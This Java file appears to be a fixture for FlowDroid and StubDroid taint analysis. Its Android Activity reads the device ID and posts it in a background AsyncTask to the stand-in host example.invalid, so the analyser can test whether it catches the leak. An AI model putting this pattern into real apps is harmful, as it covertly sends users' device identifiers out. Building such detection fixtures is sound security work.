package ai.kavach.fixture;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import java.io.DataOutputStream;
import java.net.URL;
import java.net.URLConnection;

/** No persistence boundary: validates FlowDroid's stock AsyncTask callback model. */
public final class AsyncFlowActivity extends Activity {
    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        new UploadTask().execute(manager.getDeviceId());
    }

    private static final class UploadTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... values) {
            try {
                URLConnection connection = new URL("https://example.invalid/async").openConnection();
                connection.setDoOutput(true);
                DataOutputStream output = new DataOutputStream(connection.getOutputStream());
                // StringBuilder is deliberately between source and sink to exercise StubDroid.
                String payload = new StringBuilder().append(values[0]).toString();
                output.writeBytes(payload);
                output.close();
            } catch (Exception ignored) { }
            return null;
        }
    }
}
